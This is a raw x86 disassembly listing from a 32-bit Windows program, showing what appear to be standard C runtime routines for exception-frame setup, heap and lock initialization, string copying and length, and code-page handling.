  423702:	call   0x4238a8
  423707:	mov    DWORD PTR [ebp-0x1c],0x428f08
  42370e:	cmp    DWORD PTR [ebp-0x1c],0x428f08
  423715:	jae    0x423739
  423717:	and    DWORD PTR [ebp-0x4],0x0
  42371b:	mov    eax,DWORD PTR [ebp-0x1c]
  42371e:	mov    eax,DWORD PTR [eax]
  423720:	test   eax,eax
  423722:	je     0x42372f
  423724:	call   eax
  423726:	jmp    0x42372f
  423728:	xor    eax,eax
  42372a:	inc    eax
  42372b:	ret    
  42372c:	mov    esp,DWORD PTR [ebp-0x18]
  42372f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423733:	add    DWORD PTR [ebp-0x1c],0x4
  423737:	jmp    0x42370e
  423739:	call   0x4238e3
  42373e:	ret    
  42373f:	call   0x423986
  423744:	mov    eax,ds:0x45c304
  423749:	cmp    eax,0xffffffff
  42374c:	je     0x42375c
  42374e:	push   eax
  42374f:	call   DWORD PTR ds:0x428068
  423755:	or     DWORD PTR ds:0x45c304,0xffffffff
  42375c:	ret    
  42375d:	push   ebx
  42375e:	push   esi
  42375f:	call   DWORD PTR ds:0x428014
  423765:	push   DWORD PTR ds:0x45c304
  42376b:	mov    ebx,eax
  42376d:	call   DWORD PTR ds:0x428078
  423773:	mov    esi,eax
  423775:	test   esi,esi
  423777:	jne    0x4237c2
  423779:	push   0x88
  42377e:	push   0x1
  423780:	call   0x4249c8
  423785:	mov    esi,eax
  423787:	test   esi,esi
  423789:	pop    ecx
  42378a:	pop    ecx
  42378b:	je     0x4237ba
  42378d:	push   esi
  42378e:	push   DWORD PTR ds:0x45c304
  423794:	call   DWORD PTR ds:0x428074
  42379a:	test   eax,eax
  42379c:	je     0x4237ba
  42379e:	mov    DWORD PTR [esi+0x54],0x45c258
  4237a5:	mov    DWORD PTR [esi+0x14],0x1
  4237ac:	call   DWORD PTR ds:0x428070
  4237b2:	or     DWORD PTR [esi+0x4],0xffffffff
  4237b6:	mov    DWORD PTR [esi],eax
  4237b8:	jmp    0x4237c2
  4237ba:	push   0x10
  4237bc:	call   0x422970
  4237c1:	pop    ecx
  4237c2:	push   ebx
  4237c3:	call   DWORD PTR ds:0x42806c
  4237c9:	mov    eax,esi
  4237cb:	pop    esi
  4237cc:	pop    ebx
  4237cd:	ret    
  4237ce:	call   0x42393d
  4237d3:	test   eax,eax
  4237d5:	je     0x4237e7
  4237d7:	call   DWORD PTR ds:0x42807c
  4237dd:	cmp    eax,0xffffffff
  4237e0:	mov    ds:0x45c304,eax
  4237e5:	jne    0x4237ef
  4237e7:	call   0x42373f
  4237ec:	xor    eax,eax
  4237ee:	ret    
  4237ef:	push   esi
  4237f0:	push   0x88
  4237f5:	push   0x1
  4237f7:	call   0x4249c8
  4237fc:	mov    esi,eax
  4237fe:	test   esi,esi
  423800:	pop    ecx
  423801:	pop    ecx
  423802:	je     0x423834
  423804:	push   esi
  423805:	push   DWORD PTR ds:0x45c304
  42380b:	call   DWORD PTR ds:0x428074
  423811:	test   eax,eax
  423813:	je     0x423834
  423815:	mov    DWORD PTR [esi+0x54],0x45c258
  42381c:	mov    DWORD PTR [esi+0x14],0x1
  423823:	call   DWORD PTR ds:0x428070
  423829:	or     DWORD PTR [esi+0x4],0xffffffff
  42382d:	mov    DWORD PTR [esi],eax
  42382f:	xor    eax,eax
  423831:	inc    eax
  423832:	pop    esi
  423833:	ret    
  423834:	call   0x42373f
  423839:	xor    eax,eax
  42383b:	pop    esi
  42383c:	ret    
  42383d:	cmp    DWORD PTR ds:0x45cac4,0x2
  423844:	jne    0x423853
  423846:	cmp    DWORD PTR ds:0x45cad0,0x5
  42384d:	jb     0x423853
  42384f:	xor    eax,eax
  423851:	inc    eax
  423852:	ret    
  423853:	push   0x3
  423855:	pop    eax
  423856:	ret    
  423857:	xor    eax,eax
  423859:	cmp    DWORD PTR [esp+0x4],eax
  42385d:	push   0x0
  42385f:	sete   al
  423862:	push   0x1000
  423867:	push   eax
  423868:	call   DWORD PTR ds:0x428084
  42386e:	test   eax,eax
  423870:	mov    ds:0x45d140,eax
  423875:	je     0x4238a1
  423877:	call   0x42383d
  42387c:	cmp    eax,0x3
  42387f:	mov    ds:0x45d144,eax
  423884:	jne    0x4238a4
  423886:	push   0x3f8
  42388b:	call   0x424c4a
  423890:	test   eax,eax
  423892:	pop    ecx
  423893:	jne    0x4238a4
  423895:	push   DWORD PTR ds:0x45d140
  42389b:	call   DWORD PTR ds:0x428080
  4238a1:	xor    eax,eax
  4238a3:	ret    
  4238a4:	xor    eax,eax
  4238a6:	inc    eax
  4238a7:	ret    
  4238a8:	push   0x425778
  4238ad:	mov    eax,fs:0x0
  4238b3:	push   eax
  4238b4:	mov    eax,DWORD PTR [esp+0x10]
  4238b8:	mov    DWORD PTR [esp+0x10],ebp
  4238bc:	lea    ebp,[esp+0x10]
  4238c0:	sub    esp,eax
  4238c2:	push   ebx
  4238c3:	push   esi
  4238c4:	push   edi
  4238c5:	mov    eax,DWORD PTR [ebp-0x8]
  4238c8:	mov    DWORD PTR [ebp-0x18],esp
  4238cb:	push   eax
  4238cc:	mov    eax,DWORD PTR [ebp-0x4]
  4238cf:	mov    DWORD PTR [ebp-0x4],0xffffffff
  4238d6:	mov    DWORD PTR [ebp-0x8],eax
  4238d9:	lea    eax,[ebp-0x10]
  4238dc:	mov    fs:0x0,eax
  4238e2:	ret    
  4238e3:	mov    ecx,DWORD PTR [ebp-0x10]
  4238e6:	mov    DWORD PTR fs:0x0,ecx
  4238ed:	pop    ecx
  4238ee:	pop    edi
  4238ef:	pop    esi
  4238f0:	pop    ebx
  4238f1:	leave  
  4238f2:	push   ecx
  4238f3:	ret    
  4238f4:	int3   
  4238f5:	int3   
  4238f6:	int3   
  4238f7:	int3   
  4238f8:	int3   
  4238f9:	int3   
  4238fa:	int3   
  4238fb:	int3   
  4238fc:	int3   
  4238fd:	int3   
  4238fe:	int3   
  4238ff:	int3   
  423900:	cmp    eax,0x1000
  423905:	jae    0x423915
  423907:	neg    eax
  423909:	add    eax,esp
  42390b:	add    eax,0x4
  42390e:	test   DWORD PTR [eax],eax
  423910:	xchg   esp,eax
  423911:	mov    eax,DWORD PTR [eax]
  423913:	push   eax
  423914:	ret    
  423915:	push   ecx
  423916:	lea    ecx,[esp+0x8]
  42391a:	sub    ecx,0x1000
  423920:	sub    eax,0x1000
  423925:	test   DWORD PTR [ecx],eax
  423927:	cmp    eax,0x1000
  42392c:	jae    0x42391a
  42392e:	sub    ecx,eax
  423930:	mov    eax,esp
  423932:	test   DWORD PTR [ecx],eax
  423934:	mov    esp,ecx
  423936:	mov    ecx,DWORD PTR [eax]
  423938:	mov    eax,DWORD PTR [eax+0x4]
  42393b:	push   eax
  42393c:	ret    
  42393d:	push   esi
  42393e:	push   edi
  42393f:	xor    esi,esi
  423941:	mov    edi,0x45cc20
  423946:	cmp    DWORD PTR [esi*8+0x45c314],0x1
  42394e:	jne    0x42396e
  423950:	lea    eax,[esi*8+0x45c310]
  423957:	mov    DWORD PTR [eax],edi
  423959:	push   0xfa0
  42395e:	push   DWORD PTR [eax]
  423960:	add    edi,0x18
  423963:	call   0x42493d
  423968:	test   eax,eax
  42396a:	pop    ecx
  42396b:	pop    ecx
  42396c:	je     0x42397a
  42396e:	inc    esi
  42396f:	cmp    esi,0x24
  423972:	jl     0x423946
  423974:	xor    eax,eax
  423976:	inc    eax
  423977:	pop    edi
  423978:	pop    esi
  423979:	ret    
  42397a:	and    DWORD PTR [esi*8+0x45c310],0x0
  423982:	xor    eax,eax
  423984:	jmp    0x423977
  423986:	push   ebx
  423987:	mov    ebx,DWORD PTR ds:0x428064
  42398d:	push   esi
  42398e:	mov    esi,0x45c310
  423993:	push   edi
  423994:	mov    edi,DWORD PTR [esi]
  423996:	test   edi,edi
  423998:	je     0x4239ad
  42399a:	cmp    DWORD PTR [esi+0x4],0x1
  42399e:	je     0x4239ad
  4239a0:	push   edi
  4239a1:	call   ebx
  4239a3:	push   edi
  4239a4:	call   0x4244ba
  4239a9:	and    DWORD PTR [esi],0x0
  4239ac:	pop    ecx
  4239ad:	add    esi,0x8
  4239b0:	cmp    esi,0x45c430
  4239b6:	jl     0x423994
  4239b8:	mov    esi,0x45c310
  4239bd:	pop    edi
  4239be:	mov    eax,DWORD PTR [esi]
  4239c0:	test   eax,eax
  4239c2:	je     0x4239cd
  4239c4:	cmp    DWORD PTR [esi+0x4],0x1
  4239c8:	jne    0x4239cd
  4239ca:	push   eax
  4239cb:	call   ebx
  4239cd:	add    esi,0x8
  4239d0:	cmp    esi,0x45c430
  4239d6:	jl     0x4239be
  4239d8:	pop    esi
  4239d9:	pop    ebx
  4239da:	ret    
  4239db:	push   ebp
  4239dc:	mov    ebp,esp
  4239de:	mov    eax,DWORD PTR [ebp+0x8]
  4239e1:	push   DWORD PTR [eax*8+0x45c310]
  4239e8:	call   DWORD PTR ds:0x428090
  4239ee:	pop    ebp
  4239ef:	ret    
  4239f0:	push   ebp
  4239f1:	mov    ebp,esp
  4239f3:	push   esi
  4239f4:	mov    esi,DWORD PTR [ebp+0x8]
  4239f7:	lea    esi,[esi*8+0x45c310]
  4239fe:	cmp    DWORD PTR [esi],0x0
  423a01:	je     0x423a08
  423a03:	xor    eax,eax
  423a05:	inc    eax
  423a06:	jmp    0x423a6c
  423a08:	push   edi
  423a09:	push   0x18
  423a0b:	call   0x4245d2
  423a10:	mov    edi,eax
  423a12:	test   edi,edi
  423a14:	pop    ecx
  423a15:	jne    0x423a26
  423a17:	call   0x425850
  423a1c:	mov    DWORD PTR [eax],0xc
  423a22:	xor    eax,eax
  423a24:	jmp    0x423a6b
  423a26:	push   0xa
  423a28:	call   0x423a6f
  423a2d:	cmp    DWORD PTR [esi],0x0
  423a30:	pop    ecx
  423a31:	jne    0x423a59
  423a33:	push   0xfa0
  423a38:	push   edi
  423a39:	call   0x42493d
  423a3e:	test   eax,eax
  423a40:	pop    ecx
  423a41:	pop    ecx
  423a42:	jne    0x423a55
  423a44:	push   edi
  423a45:	call   0x4244ba
  423a4a:	push   0xa
  423a4c:	call   0x4239db
  423a51:	pop    ecx
  423a52:	pop    ecx
  423a53:	jmp    0x423a17
  423a55:	mov    DWORD PTR [esi],edi
  423a57:	jmp    0x423a60
  423a59:	push   edi
  423a5a:	call   0x4244ba
  423a5f:	pop    ecx
  423a60:	push   0xa
  423a62:	call   0x4239db
  423a67:	xor    eax,eax
  423a69:	pop    ecx
  423a6a:	inc    eax
  423a6b:	pop    edi
  423a6c:	pop    esi
  423a6d:	pop    ebp
  423a6e:	ret    
  423a6f:	push   ebp
  423a70:	mov    ebp,esp
  423a72:	mov    eax,DWORD PTR [ebp+0x8]
  423a75:	push   esi
  423a76:	lea    esi,[eax*8+0x45c310]
  423a7d:	cmp    DWORD PTR [esi],0x0
  423a80:	jne    0x423a95
  423a82:	push   eax
  423a83:	call   0x4239f0
  423a88:	test   eax,eax
  423a8a:	pop    ecx
  423a8b:	jne    0x423a95
  423a8d:	push   0x11
  423a8f:	call   0x422970
  423a94:	pop    ecx
  423a95:	push   DWORD PTR [esi]
  423a97:	call   DWORD PTR ds:0x428094
  423a9d:	pop    esi
  423a9e:	pop    ebp
  423a9f:	ret    
  423aa0:	push   esi
  423aa1:	push   DWORD PTR ds:0x45d268
  423aa7:	call   0x425a06
  423aac:	pop    ecx
  423aad:	mov    ecx,DWORD PTR ds:0x45d264
  423ab3:	mov    esi,eax
  423ab5:	mov    eax,ds:0x45d268
  423aba:	mov    edx,ecx
  423abc:	sub    edx,eax
  423abe:	add    edx,0x4
  423ac1:	cmp    esi,edx
  423ac3:	jae    0x423b13
  423ac5:	mov    ecx,0x800
  423aca:	cmp    esi,ecx
  423acc:	jae    0x423ad0
  423ace:	mov    ecx,esi
  423ad0:	add    ecx,esi
  423ad2:	push   ecx
  423ad3:	push   eax
  423ad4:	call   0x425859
  423ad9:	test   eax,eax
  423adb:	pop    ecx
  423adc:	pop    ecx
  423add:	jne    0x423af6
  423adf:	add    esi,0x10
  423ae2:	push   esi
  423ae3:	push   DWORD PTR ds:0x45d268
  423ae9:	call   0x425859
  423aee:	test   eax,eax
  423af0:	pop    ecx
  423af1:	pop    ecx
  423af2:	jne    0x423af6
  423af4:	pop    esi
  423af5:	ret    
  423af6:	mov    ecx,DWORD PTR ds:0x45d264
  423afc:	sub    ecx,DWORD PTR ds:0x45d268
  423b02:	mov    ds:0x45d268,eax
  423b07:	sar    ecx,0x2
  423b0a:	lea    ecx,[eax+ecx*4]
  423b0d:	mov    DWORD PTR ds:0x45d264,ecx
  423b13:	mov    DWORD PTR [ecx],edi
  423b15:	add    DWORD PTR ds:0x45d264,0x4
  423b1c:	mov    eax,edi
  423b1e:	pop    esi
  423b1f:	ret    
  423b20:	push   0x80
  423b25:	call   0x4245d2
  423b2a:	test   eax,eax
  423b2c:	pop    ecx
  423b2d:	mov    ds:0x45d268,eax
  423b32:	jne    0x423b38
  423b34:	push   0x18
  423b36:	pop    eax
  423b37:	ret    
  423b38:	and    DWORD PTR [eax],0x0
  423b3b:	mov    eax,ds:0x45d268
  423b40:	mov    ds:0x45d264,eax
  423b45:	xor    eax,eax
  423b47:	ret    
  423b48:	push   0xc
  423b4a:	push   0x4284c8
  423b4f:	call   0x4238a8
  423b54:	call   0x422bbb
  423b59:	and    DWORD PTR [ebp-0x4],0x0
  423b5d:	mov    edi,DWORD PTR [ebp+0x8]
  423b60:	call   0x423aa0
  423b65:	mov    DWORD PTR [ebp-0x1c],eax
  423b68:	or     DWORD PTR [ebp-0x4],0xffffffff
  423b6c:	call   0x423b7a
  423b71:	mov    eax,DWORD PTR [ebp-0x1c]
  423b74:	call   0x4238e3
  423b79:	ret    
  423b7a:	call   0x422bc4
  423b7f:	ret    
  423b80:	push   DWORD PTR [esp+0x4]
  423b84:	call   0x423b48
  423b89:	neg    eax
  423b8b:	sbb    eax,eax
  423b8d:	neg    eax
  423b8f:	pop    ecx
  423b90:	dec    eax
  423b91:	ret    
  423b92:	push   ebp
  423b93:	mov    ebp,esp
  423b95:	sub    esp,0x10
  423b98:	push   ebx
  423b99:	xor    ebx,ebx
  423b9b:	cmp    DWORD PTR ds:0x45cd70,ebx
  423ba1:	push   esi
  423ba2:	push   edi
  423ba3:	jne    0x423c12
  423ba5:	push   0x428538
  423baa:	call   DWORD PTR ds:0x428098
  423bb0:	mov    edi,eax
  423bb2:	cmp    edi,ebx
  423bb4:	je     0x423c4d
  423bba:	mov    esi,DWORD PTR ds:0x42801c
  423bc0:	push   0x42852c
  423bc5:	push   edi
  423bc6:	call   esi
  423bc8:	test   eax,eax
  423bca:	mov    ds:0x45cd70,eax
  423bcf:	je     0x423c4d
  423bd1:	push   0x42851c
  423bd6:	push   edi
  423bd7:	call   esi
  423bd9:	push   0x428508
  423bde:	push   edi
  423bdf:	mov    ds:0x45cd74,eax
  423be4:	call   esi
  423be6:	cmp    DWORD PTR ds:0x45cac4,0x2
  423bed:	mov    ds:0x45cd78,eax
  423bf2:	jne    0x423c12
  423bf4:	push   0x4284ec
  423bf9:	push   edi
  423bfa:	call   esi
  423bfc:	test   eax,eax
  423bfe:	mov    ds:0x45cd80,eax
  423c03:	je     0x423c12
  423c05:	push   0x4284d4
  423c0a:	push   edi
  423c0b:	call   esi
  423c0d:	mov    ds:0x45cd7c,eax
  423c12:	mov    eax,ds:0x45cd7c
  423c17:	test   eax,eax
  423c19:	je     0x423c57
  423c1b:	call   eax
  423c1d:	test   eax,eax
  423c1f:	je     0x423c3e
  423c21:	lea    ecx,[ebp-0x4]
  423c24:	push   ecx
  423c25:	push   0xc
  423c27:	lea    ecx,[ebp-0x10]
  423c2a:	push   ecx
  423c2b:	push   0x1
  423c2d:	push   eax
  423c2e:	call   DWORD PTR ds:0x45cd80
  423c34:	test   eax,eax
  423c36:	je     0x423c3e
  423c38:	test   BYTE PTR [ebp-0x8],0x1
  423c3c:	jne    0x423c57
  423c3e:	cmp    DWORD PTR ds:0x45cad0,0x4
  423c45:	jb     0x423c51
  423c47:	or     BYTE PTR [ebp+0x12],0x20
  423c4b:	jmp    0x423c76
  423c4d:	xor    eax,eax
  423c4f:	jmp    0x423c86
  423c51:	or     BYTE PTR [ebp+0x12],0x4
  423c55:	jmp    0x423c76
  423c57:	mov    eax,ds:0x45cd74
  423c5c:	test   eax,eax
  423c5e:	je     0x423c76
  423c60:	call   eax
  423c62:	mov    ebx,eax
  423c64:	test   ebx,ebx
  423c66:	je     0x423c76
  423c68:	mov    eax,ds:0x45cd78
  423c6d:	test   eax,eax
  423c6f:	je     0x423c76
  423c71:	push   ebx
  423c72:	call   eax
  423c74:	mov    ebx,eax
  423c76:	push   DWORD PTR [ebp+0x10]
  423c79:	push   DWORD PTR [ebp+0xc]
  423c7c:	push   DWORD PTR [ebp+0x8]
  423c7f:	push   ebx
  423c80:	call   DWORD PTR ds:0x45cd70
  423c86:	pop    edi
  423c87:	pop    esi
  423c88:	pop    ebx
  423c89:	leave  
  423c8a:	ret    
  423c8b:	int3   
  423c8c:	int3   
  423c8d:	int3   
  423c8e:	int3   
  423c8f:	int3   
  423c90:	push   edi
  423c91:	mov    edi,DWORD PTR [esp+0x8]
  423c95:	jmp    0x423d05
  423c97:	lea    esp,[esp+0x0]
  423c9e:	mov    edi,edi
  423ca0:	mov    ecx,DWORD PTR [esp+0x4]
  423ca4:	push   edi
  423ca5:	test   ecx,0x3
  423cab:	je     0x423cc0
  423cad:	mov    al,BYTE PTR [ecx]
  423caf:	add    ecx,0x1
  423cb2:	test   al,al
  423cb4:	je     0x423cf3
  423cb6:	test   ecx,0x3
  423cbc:	jne    0x423cad
  423cbe:	mov    edi,edi
  423cc0:	mov    eax,DWORD PTR [ecx]
  423cc2:	mov    edx,0x7efefeff
  423cc7:	add    edx,eax
  423cc9:	xor    eax,0xffffffff
  423ccc:	xor    eax,edx
  423cce:	add    ecx,0x4
  423cd1:	test   eax,0x81010100
  423cd6:	je     0x423cc0
  423cd8:	mov    eax,DWORD PTR [ecx-0x4]
  423cdb:	test   al,al
  423cdd:	je     0x423d02
  423cdf:	test   ah,ah
  423ce1:	je     0x423cfd
  423ce3:	test   eax,0xff0000
  423ce8:	je     0x423cf8
  423cea:	test   eax,0xff000000
  423cef:	je     0x423cf3
  423cf1:	jmp    0x423cc0
  423cf3:	lea    edi,[ecx-0x1]
  423cf6:	jmp    0x423d05
  423cf8:	lea    edi,[ecx-0x2]
  423cfb:	jmp    0x423d05
  423cfd:	lea    edi,[ecx-0x3]
  423d00:	jmp    0x423d05
  423d02:	lea    edi,[ecx-0x4]
  423d05:	mov    ecx,DWORD PTR [esp+0xc]
  423d09:	test   ecx,0x3
  423d0f:	je     0x423d2e
  423d11:	mov    dl,BYTE PTR [ecx]
  423d13:	add    ecx,0x1
  423d16:	test   dl,dl
  423d18:	je     0x423d80
  423d1a:	mov    BYTE PTR [edi],dl
  423d1c:	add    edi,0x1
  423d1f:	test   ecx,0x3
  423d25:	jne    0x423d11
  423d27:	jmp    0x423d2e
  423d29:	mov    DWORD PTR [edi],edx
  423d2b:	add    edi,0x4
  423d2e:	mov    edx,0x7efefeff
  423d33:	mov    eax,DWORD PTR [ecx]
  423d35:	add    edx,eax
  423d37:	xor    eax,0xffffffff
  423d3a:	xor    eax,edx
  423d3c:	mov    edx,DWORD PTR [ecx]
  423d3e:	add    ecx,0x4
  423d41:	test   eax,0x81010100
  423d46:	je     0x423d29
  423d48:	test   dl,dl
  423d4a:	je     0x423d80
  423d4c:	test   dh,dh
  423d4e:	je     0x423d77
  423d50:	test   edx,0xff0000
  423d56:	je     0x423d6a
  423d58:	test   edx,0xff000000
  423d5e:	je     0x423d62
  423d60:	jmp    0x423d29
  423d62:	mov    DWORD PTR [edi],edx
  423d64:	mov    eax,DWORD PTR [esp+0x8]
  423d68:	pop    edi
  423d69:	ret    
  423d6a:	mov    WORD PTR [edi],dx
  423d6d:	mov    eax,DWORD PTR [esp+0x8]
  423d71:	mov    BYTE PTR [edi+0x2],0x0
  423d75:	pop    edi
  423d76:	ret    
  423d77:	mov    WORD PTR [edi],dx
  423d7a:	mov    eax,DWORD PTR [esp+0x8]
  423d7e:	pop    edi
  423d7f:	ret    
  423d80:	mov    BYTE PTR [edi],dl
  423d82:	mov    eax,DWORD PTR [esp+0x8]
  423d86:	pop    edi
  423d87:	ret    
  423d88:	int3   
  423d89:	int3   
  423d8a:	int3   
  423d8b:	int3   
  423d8c:	int3   
  423d8d:	int3   
  423d8e:	int3   
  423d8f:	int3   
  423d90:	mov    ecx,DWORD PTR [esp+0xc]
  423d94:	push   edi
  423d95:	test   ecx,ecx
  423d97:	je     0x423e2f
  423d9d:	push   esi
  423d9e:	push   ebx
  423d9f:	mov    ebx,ecx
  423da1:	mov    esi,DWORD PTR [esp+0x14]
  423da5:	test   esi,0x3
  423dab:	mov    edi,DWORD PTR [esp+0x10]
  423daf:	jne    0x423dbc
  423db1:	shr    ecx,0x2
  423db4:	jne    0x423e3f
  423dba:	jmp    0x423de3
  423dbc:	mov    al,BYTE PTR [esi]
  423dbe:	add    esi,0x1
  423dc1:	mov    BYTE PTR [edi],al
  423dc3:	add    edi,0x1
  423dc6:	sub    ecx,0x1
  423dc9:	je     0x423df6
  423dcb:	test   al,al
  423dcd:	je     0x423dfe
  423dcf:	test   esi,0x3
  423dd5:	jne    0x423dbc
  423dd7:	mov    ebx,ecx
  423dd9:	shr    ecx,0x2
  423ddc:	jne    0x423e3f
  423dde:	and    ebx,0x3
  423de1:	je     0x423df6
  423de3:	mov    al,BYTE PTR [esi]
  423de5:	add    esi,0x1
  423de8:	mov    BYTE PTR [edi],al
  423dea:	add    edi,0x1
  423ded:	test   al,al
  423def:	je     0x423e28
  423df1:	sub    ebx,0x1
  423df4:	jne    0x423de3
  423df6:	mov    eax,DWORD PTR [esp+0x10]
  423dfa:	pop    ebx
  423dfb:	pop    esi
  423dfc:	pop    edi
  423dfd:	ret    
  423dfe:	test   edi,0x3
  423e04:	je     0x423e1c
  423e06:	mov    BYTE PTR [edi],al
  423e08:	add    edi,0x1
  423e0b:	sub    ecx,0x1
  423e0e:	je     0x423eac
  423e14:	test   edi,0x3
  423e1a:	jne    0x423e06
  423e1c:	mov    ebx,ecx
  423e1e:	shr    ecx,0x2
  423e21:	jne    0x423e97
  423e23:	mov    BYTE PTR [edi],al
  423e25:	add    edi,0x1
  423e28:	sub    ebx,0x1
  423e2b:	jne    0x423e23
  423e2d:	pop    ebx
  423e2e:	pop    esi
  423e2f:	mov    eax,DWORD PTR [esp+0x8]
  423e33:	pop    edi
  423e34:	ret    
  423e35:	mov    DWORD PTR [edi],edx
  423e37:	add    edi,0x4
  423e3a:	sub    ecx,0x1
  423e3d:	je     0x423dde
  423e3f:	mov    edx,0x7efefeff
  423e44:	mov    eax,DWORD PTR [esi]
  423e46:	add    edx,eax
  423e48:	xor    eax,0xffffffff
  423e4b:	xor    eax,edx
  423e4d:	mov    edx,DWORD PTR [esi]
  423e4f:	add    esi,0x4
  423e52:	test   eax,0x81010100
  423e57:	je     0x423e35
  423e59:	test   dl,dl
  423e5b:	je     0x423e89
  423e5d:	test   dh,dh
  423e5f:	je     0x423e7f
  423e61:	test   edx,0xff0000
  423e67:	je     0x423e75
  423e69:	test   edx,0xff000000
  423e6f:	jne    0x423e35
  423e71:	mov    DWORD PTR [edi],edx
  423e73:	jmp    0x423e8d
  423e75:	and    edx,0xffff
  423e7b:	mov    DWORD PTR [edi],edx
  423e7d:	jmp    0x423e8d
  423e7f:	and    edx,0xff
  423e85:	mov    DWORD PTR [edi],edx
  423e87:	jmp    0x423e8d
  423e89:	xor    edx,edx
  423e8b:	mov    DWORD PTR [edi],edx
  423e8d:	add    edi,0x4
  423e90:	xor    eax,eax
  423e92:	sub    ecx,0x1
  423e95:	je     0x423ea3
  423e97:	xor    eax,eax
  423e99:	mov    DWORD PTR [edi],eax
  423e9b:	add    edi,0x4
  423e9e:	sub    ecx,0x1
  423ea1:	jne    0x423e99
  423ea3:	and    ebx,0x3
  423ea6:	jne    0x423e23
  423eac:	mov    eax,DWORD PTR [esp+0x10]
  423eb0:	pop    ebx
  423eb1:	pop    esi
  423eb2:	pop    edi
  423eb3:	ret    
  423eb4:	int3   
  423eb5:	int3   
  423eb6:	int3   
  423eb7:	int3   
  423eb8:	int3   
  423eb9:	int3   
  423eba:	int3   
  423ebb:	int3   
  423ebc:	int3   
  423ebd:	int3   
  423ebe:	int3   
  423ebf:	int3   
  423ec0:	mov    ecx,DWORD PTR [esp+0x4]
  423ec4:	test   ecx,0x3
  423eca:	je     0x423ef0
  423ecc:	mov    al,BYTE PTR [ecx]
  423ece:	add    ecx,0x1
  423ed1:	test   al,al
  423ed3:	je     0x423f23
  423ed5:	test   ecx,0x3
  423edb:	jne    0x423ecc
  423edd:	add    eax,0x0
  423ee2:	lea    esp,[esp+0x0]
  423ee9:	lea    esp,[esp+0x0]
  423ef0:	mov    eax,DWORD PTR [ecx]
  423ef2:	mov    edx,0x7efefeff
  423ef7:	add    edx,eax
  423ef9:	xor    eax,0xffffffff
  423efc:	xor    eax,edx
  423efe:	add    ecx,0x4
  423f01:	test   eax,0x81010100
  423f06:	je     0x423ef0
  423f08:	mov    eax,DWORD PTR [ecx-0x4]
  423f0b:	test   al,al
  423f0d:	je     0x423f41
  423f0f:	test   ah,ah
  423f11:	je     0x423f37
  423f13:	test   eax,0xff0000
  423f18:	je     0x423f2d
  423f1a:	test   eax,0xff000000
  423f1f:	je     0x423f23
  423f21:	jmp    0x423ef0
  423f23:	lea    eax,[ecx-0x1]
  423f26:	mov    ecx,DWORD PTR [esp+0x4]
  423f2a:	sub    eax,ecx
  423f2c:	ret    
  423f2d:	lea    eax,[ecx-0x2]
  423f30:	mov    ecx,DWORD PTR [esp+0x4]
  423f34:	sub    eax,ecx
  423f36:	ret    
  423f37:	lea    eax,[ecx-0x3]
  423f3a:	mov    ecx,DWORD PTR [esp+0x4]
  423f3e:	sub    eax,ecx
  423f40:	ret    
  423f41:	lea    eax,[ecx-0x4]
  423f44:	mov    ecx,DWORD PTR [esp+0x4]
  423f48:	sub    eax,ecx
  423f4a:	ret    
  423f4b:	push   0x8
  423f4d:	push   0x428548
  423f52:	call   0x4238a8
  423f57:	and    DWORD PTR [ebp-0x4],0x0
  423f5b:	push   0x0
  423f5d:	push   0x1
  423f5f:	call   0x425ad2
  423f64:	pop    ecx
  423f65:	pop    ecx
  423f66:	jmp    0x423f6f
  423f68:	xor    eax,eax
  423f6a:	inc    eax
  423f6b:	ret    
  423f6c:	mov    esp,DWORD PTR [ebp-0x18]
  423f6f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423f73:	push   0x3
  423f75:	call   DWORD PTR ds:0x42802c
  423f7b:	int3   
  423f7c:	cmp    ecx,DWORD PTR ds:0x45c430
  423f82:	jne    0x423f85
  423f84:	ret    
  423f85:	jmp    0x423f4b
  423f8a:	movzx  eax,BYTE PTR [esp+0x4]
  423f8f:	mov    cl,BYTE PTR [esp+0xc]
  423f93:	test   BYTE PTR [eax+0x45cf21],cl
  423f99:	jne    0x423fb7
  423f9b:	cmp    DWORD PTR [esp+0x8],0x0
  423fa0:	je     0x423fb0
  423fa2:	movzx  eax,WORD PTR [eax*2+0x428942]
  423faa:	and    eax,DWORD PTR [esp+0x8]
  423fae:	jmp    0x423fb2
  423fb0:	xor    eax,eax
  423fb2:	test   eax,eax
  423fb4:	jne    0x423fb7
  423fb6:	ret    
  423fb7:	xor    eax,eax
  423fb9:	inc    eax
  423fba:	ret    
  423fbb:	push   0x4
  423fbd:	push   0x0
  423fbf:	push   DWORD PTR [esp+0xc]
  423fc3:	call   0x423f8a
  423fc8:	add    esp,0xc
  423fcb:	ret    
  423fcc:	sub    eax,0x3a4
  423fd1:	je     0x423ff5
  423fd3:	sub    eax,0x4
  423fd6:	je     0x423fef
  423fd8:	sub    eax,0xd
  423fdb:	je     0x423fe9
  423fdd:	dec    eax
  423fde:	je     0x423fe3
  423fe0:	xor    eax,eax
  423fe2:	ret    
  423fe3:	mov    eax,0x404
  423fe8:	ret    
  423fe9:	mov    eax,0x412
  423fee:	ret    
  423fef:	mov    eax,0x804
  423ff4:	ret    
  423ff5:	mov    eax,0x411
  423ffa:	ret    
  423ffb:	push   edi
  423ffc:	push   0x40
  423ffe:	xor    eax,eax
  424000:	pop    ecx
  424001:	mov    edi,0x45cf20
  424006:	rep stos DWORD PTR es:[edi],eax
  424008:	stos   BYTE PTR es:[edi],al
  424009:	xor    eax,eax
  42400b:	mov    ds:0x45d024,eax
  424010:	mov    ds:0x45cf1c,eax
  424015:	mov    ds:0x45cf14,eax
  42401a:	mov    edi,0x45d030
  42401f:	stos   DWORD PTR es:[edi],eax
  424020:	stos   DWORD PTR es:[edi],eax
  424021:	stos   DWORD PTR es:[edi],eax
  424022:	pop    edi
  424023:	ret    
  424024:	push   ebp
  424025:	mov    ebp,esp
  424027:	sub    esp,0x518
  42402d:	mov    eax,ds:0x45c430
  424032:	xor    eax,DWORD PTR [ebp+0x4]
  424035:	push   esi
  424036:	mov    DWORD PTR [ebp-0x4],eax
  424039:	lea    eax,[ebp-0x18]
  42403c:	push   eax
  42403d:	push   DWORD PTR ds:0x45d024
  424043:	call   DWORD PTR ds:0x4280a4
  424049:	cmp    eax,0x1
  42404c:	mov    esi,0x100
  424051:	jne    0x424164
  424057:	xor    eax,eax
  424059:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424060:	inc    eax
  424061:	cmp    eax,esi
  424063:	jb     0x424059
  424065:	mov    al,BYTE PTR [ebp-0x12]
  424068:	test   al,al
  42406a:	mov    BYTE PTR [ebp-0x118],0x20
  424071:	je     0x4240a9
  424073:	push   ebx
